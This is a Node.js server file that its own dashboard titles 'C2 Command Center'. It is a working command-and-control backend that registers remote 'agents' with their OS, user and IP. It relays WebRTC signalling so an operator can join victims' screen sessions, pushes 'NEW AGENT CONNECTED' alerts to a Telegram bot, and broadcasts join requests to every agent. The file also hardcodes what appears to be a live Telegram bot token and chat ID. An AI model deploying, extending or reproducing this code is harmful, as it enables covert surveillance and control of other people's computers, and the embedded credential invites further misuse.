const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let clients = {};
let logBuffer = [];
const MAX_LOGS = 500;

// --- HELPER FUNCTIONS ---
function logToFile(msg) {
 const timestamp = new Date().toISOString();
 const line = `[${timestamp}] ${msg}`;
 logBuffer.push(line);
 if (logBuffer.length > MAX_LOGS) logBuffer.shift();
 console.log(line);
 broadcastLogToAdmins(line);
}

function notifyTelegram(msg) {
 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
 require('https').get(url, (res) => {}).on('error', (e) => logToFile(`[TG ERROR] ${e.message}`));
}

function notifyAdmin(id, msg) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
 }
 });
}

function broadcastToAdmin(sourceId, data) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: sourceId, ...data }));
 }
 });
}

function broadcastLogToAdmins(line) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ type: 'system_log', message: line }));
 }
 });
}

// --- HTTP ROUTING ---
app.use(express.static(__dirname)); // Serves index.html/admin.html if present

app.get('/', (req, res) => {
 // Serve the admin dashboard directly from memory
 const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 Command Center</title>
    <style>
        body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
        h1 { margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; transition: transform 0.2s; }
        .card:hover { transform: translateY(-2px); border-color: #3b82f6; cursor: pointer; }
        .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
        .btn:hover { background: #2563eb; }
        #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
        .log-time { color: #64748b; margin-right: 8px; }
        .log-alert-green { color: #4ade80; }
        .log-alert-red { color: #f87171; }
        .log-alert-blue { color: #60a5fa; }
        .status-dot { height: 10px; width: 10px; background-color: #4ade80; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
    </style>
</head>
<body>
    <h1>🛡️ C2 Command Center</h1>
    <div class="grid" id="userGrid"></div>
    <div id="emptyState" class="empty-state">Waiting for connections...</div>
    <h3>Live Event Log</h3>
    <div id="logs-container"></div>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const host = window.location.host;
        const wsUrl = \`\${protocol}//\${host}/\`;
        const ws = new WebSocket(wsUrl);
        let users = {};
        
        ws.onopen = () => {
            ws.send(JSON.stringify({ type: 'register_admin' }));
            addLog("Connected to C2 Server", "blue");
        };

        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'registered') {
                    addLog("Admin Session Registered", "blue");
                } else if (data.type === 'alert') {
                    addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                } else if (data.type === 'info') {
                    addLog(\`🟢 New User: \${data.os || 'Unknown'} (\${data.user || 'Unknown'})\`, 'green');
                    if (!users[data.id]) {
                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
                    } else {
                        users[data.id].status = 'Online';
                        users[data.id].info = data;
                        users[data.id].lastSeen = Date.now();
                    }
                    renderUsers();
                } else if (data.type === 'heartbeat') {
                    if (users[data.id]) {
                        users[data.id].lastSeen = Date.now();
                        users[data.id].status = 'Online';
                        renderUsers();
                    }
                } else if (data.type === 'system') {
                    addLog(data.message, "blue");
                } else if (data.type === 'screen_data') {
                    addLog(\`📺 Screen update from \${data.id}\`, 'blue');
                    if (!users[data.id]) {
                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                    }
                    users[data.id].lastSeen = Date.now();
                    renderUsers();
                } else if (data.type === 'system_log') {
                    addLog(data.message, 'white');
                } else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
                    // Store signaling data for when joinUser is clicked
                    if (!users[data.targetId]) {
                        users[data.targetId] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now() };
                    }
                    users[data.targetId].signalingData = data; // Store for later use
                    renderUsers();
                    addLog(\`[SIG] Received \${data.type} for \${data.targetId}\`, 'blue');
                }
            } catch (e) { console.error(e); }
        };

        function addLog(msg, colorClass = '') {
            const logContainer = document.getElementById('logs-container');
            const div = document.createElement('div');
            div.className = \`log-entry log-alert-\${colorClass}\`;
            const timeSpan = document.createElement('span');
            timeSpan.className = 'log-time';
            timeSpan.innerText = new Date().toLocaleTimeString();
            const msgSpan = document.createElement('span');
            msgSpan.innerText = msg;
            div.appendChild(timeSpan);
            div.appendChild(msgSpan);
            logContainer.prepend(div);
            if (logContainer.children.length > 100) logContainer.removeChild(logContainer.lastChild);
        }

        function renderUsers() {
            const grid = document.getElementById('userGrid');
            const emptyState = document.getElementById('emptyState');
            grid.innerHTML = '';
            const userCount = Object.keys(users).length;
            if (userCount === 0) {
                emptyState.style.display = 'block';
                return;
            } else {
                emptyState.style.display = 'none';
            }
            for (const [id, data] of Object.entries(users)) {
                const card = document.createElement('div');
                card.className = 'card';
                const osInfo = data.info ? \`\${data.info.os} / \${data.info.user}\` : 'Unknown OS';
                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
                card.innerHTML = \`
                    <strong>User ID: \${id}</strong><br>
                    <span class="status-dot"></span> Info: \${osInfo}<br>
                    Last Seen: \${lastSeen}<br>
                    <button class="btn" onclick="joinUser('\${id}')">Join Session</button>
                \`;
                grid.appendChild(card);
            }
        }

        function joinUser(id) {
            // If we have stored signaling data, send it back to the target
            if (users[id] && users[id].signalingData) {
                const sigData = users[id].signalingData;
                // Send offer/answer/candidate back to the target agent
                ws.send(JSON.stringify({
                    type: sigData.type,
                    targetId: id,
                    sdp: sigData.sdp,
                    candidate: sigData.candidate
                }));
                addLog(\`[ADMIN] Sent \${sigData.type} to \${id}\`, 'green');
            } else {
                // If no signaling data yet, just request a connection
                ws.send(JSON.stringify({
                    type: 'request_join',
                    targetId: id,
                    from: null // Admin ID would be tracked here
                }));
                addLog(\`[ADMIN] Requested join to \${id}\`, 'blue');
            }
            
            // Visual feedback
            const card = document.querySelector(\`button[onclick="joinUser('\${id}')"]\`).parentElement;
            card.style.borderColor = '#4ade80';
            setTimeout(() => card.style.borderColor = '#3b82f6', 500);
        }
    </script>
</body>
</html>
 `;
 res.writeHead(200, { 'Content-Type': 'text/html' });
 res.end(htmlContent);
});

app.get('/health', (req, res) => {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
});

// --- WEBSOCKET HANDLING ---
wss.on('connection', (ws, req) => {
 let id = uuidv4().substr(0, 8);
 ws.id = id;
 clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

 logToFile(`[+] Client Connected: ${id}`);
 ws.send(JSON.stringify({ type: 'registered', id: id }));

 // Heartbeat
 let pingInterval = setInterval(() => {
 if (ws.readyState === WebSocket.OPEN) {
 ws.ping();
 } else {
 clearInterval(pingInterval);
 }
 }, 25000);

 ws.on('message', (msgRaw) => {
 try {
 const data = JSON.parse(msgRaw);
 logToFile(`[MSG] Received from ${id}: ${data.type}`);

 if (data.type === 'register_admin') {
 clients[id].isAdmin = true;
 logToFile(`[ADMIN] Connected with ID: ${id}`);
 return;
 }

 if (data.type === 'info') {
 clients[id].info = data;
 clients[id].lastSeen = Date.now();
 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
 broadcastToAdmin(id, data);
 notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
 } 
 else if (data.type === 'heartbeat') {
 clients[id].lastSeen = Date.now();
 } 
 else if (['offer', 'answer', 'candidate'].includes(data.type)) {
 // Forward signaling data to the specific target
 if (data.targetId && clients[data.targetId]) {
 const targetWs = clients[data.targetId].ws;
 if (targetWs.readyState === WebSocket.OPEN) {
 targetWs.send(JSON.stringify(data));
 }
 }
 } 
 else if (data.type === 'join_all') {
 // Broadcast join request to all other agents
 Object.keys(clients).forEach(cid => {
 if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
 clients[cid].ws.send(JSON.stringify({
 type: 'join_request',
 from: id,
 timestamp: Date.now()
 }));
 }
 });
 }
 else {
 if (!clients[id].info && !clients[id].isAdmin) {
 clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
 notifyAdmin(id, `📺 Screen Active: ${id}`);
 }
 broadcastToAdmin(id, data);
 }
 } catch (e) {
 logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
 }
 });

 ws.on('close', () => {
 delete clients[id];
 notifyAdmin(id, '🔴 User Disconnected');
 notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
 logToFile(`[-] Client Disconnected: ${id}`);
 });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
 logToFile(`C2 Server running on port ${PORT}`);
});
